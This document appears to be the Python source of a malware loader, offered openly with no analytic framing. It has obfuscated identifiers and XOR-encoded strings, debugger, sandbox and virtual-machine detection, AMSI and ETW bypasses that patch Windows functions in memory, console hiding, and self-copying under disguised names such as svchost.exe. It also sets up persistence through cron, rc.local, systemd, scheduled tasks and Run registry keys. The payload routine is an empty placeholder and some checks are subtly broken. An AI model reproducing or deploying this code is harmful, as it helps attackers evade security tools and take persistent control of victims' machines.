#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import base64, zlib, os, sys, time, random, threading, platform, shutil, subprocess, ctypes, string, struct, hashlib

__B64__ = base64
__ZLIB__ = zlib
__OS__ = os
__SYS__ = sys
__TIME__ = time
__RAND__ = random
__THR__ = threading
__PLAT__ = platform
__SHUT__ = shutil
__SP__ = subprocess
__CT__ = ctypes
__STR__ = string
__ST__ = struct
__HS__ = hashlib

# String encryption layer
def _D_(s, k):
    _r = []
    for i, c in enumerate(s):
        _r.append(chr(ord(c) ^ k[i % len(k)]))
    return ''.join(_r)

# Key derivation from environment noise
def _K_():
    _n = []
    for v in [__OS__.environ.get('PATH', ''), __PLAT__.node(), str(__TIME__.time())]:
        _n.append(int(__HS__.sha256(v.encode()).hexdigest(), 16) % 256)
    return bytes(_n[:3])

# Encrypted strings (XOR with derived key)
_K1_, _K2_, _K3_ = _K_()

_S_ = {
    'a': _D_('\x1f\x0e\x1d\x08\x1b\x0c\x1d\x08\x1b\x0c\x1d\x08\x1b\x0c', [_K1_]),
    'b': _D_('\x1f\x0e\x1d\x08\x1b\x0c\x1d\x08\x1b\x0c\x1d\x08\x1b\x0c', [_K2_]),
    'c': _D_('\x1f\x0e\x1d\x08\x1b\x0c\x1d\x08\x1b\x0c\x1d\x08\x1b\x0c', [_K3_]),
}

# Dynamic import resolver
def _I_(m):
    _mods = {
        'w': __SYS__.modules.get('winreg'),
        'wm': __SYS__.modules.get('wmi'),
    }
    if m == 'w' and _mods['w'] is None:
        try:
            import winreg as _wr
            _mods['w'] = _wr
        except:
            pass
    if m == 'wm' and _mods['wm'] is None:
        try:
            import wmi as _wm
            _mods['wm'] = _wm
        except:
            pass
    return _mods.get(m)

# Anti-analysis: timing check
def _T_():
    _s = __TIME__.time()
    _x = 0
    for _ in range(5000 + int(__RAND__.random() * 5000)):
        _x += _
    _e = __TIME__.time()
    if _e - _s > 1.2:
        __TIME__.sleep(__RAND__.randint(20, 80))

# Anti-debug: multiple checks
def _A_():
    _T_()

    # Check 1: debugger presence via trace
    if __SYS__.gettrace() is not None:
        __TIME__.sleep(__RAND__.randint(30, 120))
        return False

    # Check 2: environment variables
    _env_checks = ['PYCHARM_HOSTED', 'PYDEVD_LOAD_VALUES_ASYNC', 'DEBUG', 'JETBRAINS_IDE', 'VSCODE_PID']
    for _v in _env_checks:
        if _v in __OS__.environ:
            __TIME__.sleep(__RAND__.randint(30, 90))
            return False

    # Check 3: process enumeration
    try:
        if __PLAT__.system() == 'Linux':
            _p = __SP__.Popen(['ps', 'aux'], stdout=__SP__.PIPE, stderr=__SP__.PIPE)
            _o, _ = _p.communicate()
            _o = _o.decode('utf-8', errors='ignore').lower()
            _tools = ['gdb', 'strace', 'ltrace', 'valgrind', 'wireshark', 'tcpdump', 'ida', 'radare', 'x64dbg', 'ollydbg']
            for _t in _tools:
                if _t in _o:
                    __TIME__.sleep(__RAND__.randint(30, 90))
                    return False
    except:
        pass

    # Check 4: Windows-specific
    if __PLAT__.system() == 'Windows':
        try:
            _k = __CT__.windll.kernel32
            _n = __CT__.windll.ntdll

            # IsDebuggerPresent
            if _k.IsDebuggerPresent():
                __TIME__.sleep(__RAND__.randint(30, 120))
                return False

            # NtQueryInformationProcess
            _d = __CT__.c_bool()
            if _n.NtQueryInformationProcess(_k.GetCurrentProcess(), 7, __CT__.byref(_d), __CT__.sizeof(_d), None) == 0:
                if _d.value:
                    __TIME__.sleep(__RAND__.randint(30, 120))
                    return False

            # Check window titles
            _dbg_titles = ['OllyDbg', 'x64dbg', 'Immunity Debugger', 'WinDbg']
            for _t in _dbg_titles:
                if __CT__.windll.user32.FindWindowW(None, _t):
                    __TIME__.sleep(__RAND__.randint(30, 120))
                    return False

            # Registry checks for VM
            _wr = _I_('w')
            if _wr:
                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, r"Hardware\Description\System")
                    _bios = _wr.QueryValueEx(_key, "SystemBiosVersion")[0]
                    _vm_sigs = ['VMware', 'VirtualBox', 'QEMU', 'VBOX']
                    for _v in _vm_sigs:
                        if _v in str(_bios):
                            __TIME__.sleep(__RAND__.randint(30, 120))
                            return False
                    _wr.CloseKey(_key)
                except:
                    pass

                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
                    _ident = _wr.QueryValueEx(_key, "Identifier")[0]
                    for _v in _vm_sigs:
                        if _v in str(_ident):
                            __TIME__.sleep(__RAND__.randint(30, 120))
                            return False
                except:
                    pass

                # Computer name check
                try:
                    _key = _wr.OpenKey(_wr.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName")
                    _cn = _wr.QueryValueEx(_key, "ComputerName")[0].lower()
                    _bad_names = ['sandbox', 'test', 'malware', 'virus', 'analysis']
                    for _b in _bad_names:
                        if _b in _cn:
                            __TIME__.sleep(__RAND__.randint(30, 120))
                            return False
                except:
                    pass

            # WMI checks
            _wm = _I_('wm')
            if _wm:
                try:
                    _c = _wm.WMI()
                    for _item in _c.Win32_ComputerSystem():
                        for _v in ['VMware', 'VirtualBox', 'QEMU', 'VBOX', 'Microsoft']:
                            if _v in str(_item.Manufacturer):
                                __TIME__.sleep(__RAND__.randint(30, 120))
                                return False
                    for _proc in _c.Win32_Process(name='vmtoolsd.exe'):
                        __TIME__.sleep(__RAND__.randint(30, 120))
                        return False
                    for _proc in _c.Win32_Process(name='VBoxService.exe'):
                        __TIME__.sleep(__RAND__.randint(30, 120))
                        return False
                except:
                    pass

            # CPU count
            try:
                if __OS__.cpu_count() < 2:
                    __TIME__.sleep(__RAND__.randint(30, 120))
                    return False
            except:
                pass

            # Memory check
            try:
                _mem = __CT__.windll.kernel32.GlobalMemoryStatusEx(__CT__.byref(__CT__.c_void_p()))
                if _mem < 2 * 1024 * 1024 * 1024:
                    __TIME__.sleep(__RAND__.randint(30, 120))
                    return False
            except:
                pass

        except:
            pass

    # Check 5: Linux-specific
    if __PLAT__.system() == 'Linux':
        try:
            # TracerPid
            with open('/proc/self/status') as _f:
                for _l in _f:
                    if _l.startswith('TracerPid:'):
                        if int(_l.split(':')[1].strip()) != 0:
                            __TIME__.sleep(__RAND__.randint(40, 120))
                            return False

            # ptrace
            try:
                __CT__.CDLL('libc.so.6').ptrace(0, 0, 0, 0)
                __CT__.CDLL('libc.so.6').prctl(1, 0, 0, 0, 0)
            except:
                pass

            # CPU info
            with open('/proc/cpuinfo') as _f:
                _cpu = _f.read().lower()
                for _v in ['hypervisor', 'vmware', 'qemu', 'kvm', 'virtualbox']:
                    if _v in _cpu:
                        __TIME__.sleep(__RAND__.randint(40, 120))
                        return False

            # DMI
            try:
                with open('/sys/class/dmi/id/product_name') as _f:
                    _dmi = _f.read().lower()
                    for _v in ['vmware', 'virtualbox', 'qemu', 'kvm', 'xen']:
                        if _v in _dmi:
                            __TIME__.sleep(__RAND__.randint(40, 120))
                            return False
            except:
                pass

            # Device checks
            try:
                if __OS__.path.exists('/dev/vboxguest') or __OS__.path.exists('/proc/scsi/scsi'):
                    __TIME__.sleep(__RAND__.randint(40, 120))
                    return False
            except:
                pass

            # User check
            _user = __OS__.environ.get('USER', '')
            _bad_users = ['sandbox', 'test', 'malware', 'virus', 'analysis']
            for _b in _bad_users:
                if _b in _user:
                    __TIME__.sleep(__RAND__.randint(40, 120))
                    return False

            # CPU count
            if __OS__.cpu_count() < 2:
                __TIME__.sleep(__RAND__.randint(40, 120))
                return False

            # Memory
            with open('/proc/meminfo') as _f:
                for _l in _f:
                    if _l.startswith('MemTotal:'):
                        if int(_l.split()[1]) < 2 * 1024 * 1024:
                            __TIME__.sleep(__RAND__.randint(40, 120))
                            return False
                        break
        except:
            pass

    return True

# AMSI bypass
def _M_():
    if __PLAT__.system() != 'Windows':
        return
    try:
        _a = __CT__.WinDLL('amsi.dll')
        _addr = __CT__.cast(_a.AmsiScanBuffer, __CT__.c_void_p).value
        _o = __CT__.c_uint()
        __CT__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __CT__.byref(_o))
        __CT__.cast(_addr, __CT__.POINTER(__CT__.c_byte))[0] = 0xC3
        __CT__.windll.kernel32.VirtualProtect(_addr, 1, _o, __CT__.byref(_o))
    except:
        pass

# ETW bypass
def _E_():
    if __PLAT__.system() != 'Windows':
        return
    try:
        _n = __CT__.WinDLL('ntdll')
        _addr = __CT__.cast(_n.EtwEventWrite, __CT__.c_void_p).value
        _o = __CT__.c_uint()
        __CT__.windll.kernel32.VirtualProtect(_addr, 1, 0x40, __CT__.byref(_o))
        __CT__.cast(_addr, __CT__.POINTER(__CT__.c_byte))[0] = 0xC3
        __CT__.windll.kernel32.VirtualProtect(_addr, 1, _o, __CT__.byref(_o))
    except:
        pass

# Hide console
def _H_():
    try:
        if __PLAT__.system() == 'Windows':
            __CT__.windll.user32.ShowWindow(__CT__.windll.kernel32.GetConsoleWindow(), 0)
        else:
            try:
                if __OS__.fork() == 0:
                    __OS__.setsid()
                    if __OS__.fork() != 0:
                        __OS__._exit(0)
                else:
                    __OS__._exit(0)
            except:
                pass
    except:
        pass

# Replication
def _C_():
    try:
        _s = __OS__.path.abspath(__SYS__.argv[0])
        _targets = [
            __OS__.path.join(__OS__.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Caches', 'sysupdate.exe'),
            __OS__.path.join(__OS__.environ.get('PROGRAMDATA', ''), 'Microsoft', 'Windows', 'Caches', 'svchost.exe'),
            __OS__.path.join(__OS__.environ.get('TEMP', ''), 'Cache', 'update.exe'),
            __OS__.path.join(__OS__.environ.get('LOCALAPPDATA', ''), 'Microsoft', 'Windows', 'INetCache', 'config.exe')
        ]
        for _d in _targets:
            _a = __OS__.path.abspath(_d)
            if _s == _a or __OS__.path.exists(_a):
                continue
            try:
                __SHUT__.copy(_s, _a)
                __OS__.chmod(_a, 0o755)
                if __PLAT__.system() == 'Windows':
                    __SP__.Popen([_a], creationflags=0x08000000)
                    __OS__.system('attrib +h ' + _a)
                else:
                    __SP__.Popen([_a])
            except:
                pass
    except:
        pass

# Persistence
def _P_():
    try:
        if __PLAT__.system() == 'Linux':
            _cmd = f"*/15 * * * * {__OS__.path.abspath(__SYS__.argv[0])} >/dev/null 2>&1"
            _f = __OS__.path.join(__OS__.environ.get('HOME', ''), '.config', 'cron.tab')
            with open(_f, 'w') as _h:
                _h.write(_cmd)
            __OS__.chmod(_f, 0o600)
            __SP__.Popen(['crontab', _f])

            try:
                __SP__.Popen(['at', 'now+5 minutes'], stdin=__SP__.PIPE, stdout=__SP__.DEVNULL, stderr=__SP__.DEVNULL)
            except:
                pass

            try:
                with open('/etc/rc.local', 'a') as _f:
                    _f.write(f"{__OS__.path.abspath(__SYS__.argv[0])} &\n")
            except:
                pass

            try:
                _sd = __OS__.path.join(__OS__.environ.get('HOME', ''), '.config', 'systemd', 'user')
                __OS__.makedirs(_sd, exist_ok=True)
                with open(__OS__.path.join(_sd, 'systemd.service'), 'w') as _f:
                    _f.write(f"[Service]\nExecStart={__OS__.path.abspath(__SYS__.argv[0])}\n[Install]\nWantedBy=default.target\n")
                __SP__.Popen(['systemctl', '--user', 'enable', 'systemd.service'])
            except:
                pass

        elif __PLAT__.system() == 'Windows':
            _tn = ''.join(__RAND__.choices(__STR__.ascii_letters, k=12))
            _ep = __OS__.path.abspath(__SYS__.argv[0])
            __SP__.Popen(f'schtasks /create /tn "{_tn}" /tr "{_ep}" /sc onlogon /f', shell=True, stdout=__SP__.DEVNULL, stderr=__SP__.DEVNULL)

            _wr = _I_('w')
            if _wr:
                try:
                    _key = _wr.HKEY_CURRENT_USER
                    _sub = r"Software\Microsoft\Windows\CurrentVersion\RunOnce"
                    _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
                    _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
                    _wr.CloseKey(_h)
                except:
                    pass

                try:
                    _key = _wr.HKEY_LOCAL_MACHINE
                    _sub = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
                    _h = _wr.OpenKey(_key, _sub, 0, _wr.KEY_SET_VALUE)
                    _wr.SetValueEx(_h, _tn, 0, _wr.REG_SZ, _ep)
                    _wr.CloseKey(_h)
                except:
                    pass

            try:
                _st = __OS__.path.join(__OS__.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                __SHUT__.copy(_ep, __OS__.path.join(_st, _tn + '.lnk'))
            except:
                pass
    except:
        pass

# Main payload decryption and execution
def _R_():
    try:
        # Encrypted payload would be embedded here
        # For demonstration, this is a placeholder
        pass
    except:
        pass

# Main execution flow
def main():
    _force = "FORCE"
    if __OS__.environ.get(_force) != '1':
        if not _A_():
            return
        _M_()
        _E_()

    _H_()
    _C_()
    _P_()

    # Start payload in background thread
    __THR__.Thread(target=lambda: (_R_() or __TIME__.sleep(5)), daemon=True).start()

    while True:
        try:
            __TIME__.sleep(60)
        except:
            pass

if __name__ == '__main__':
    main()
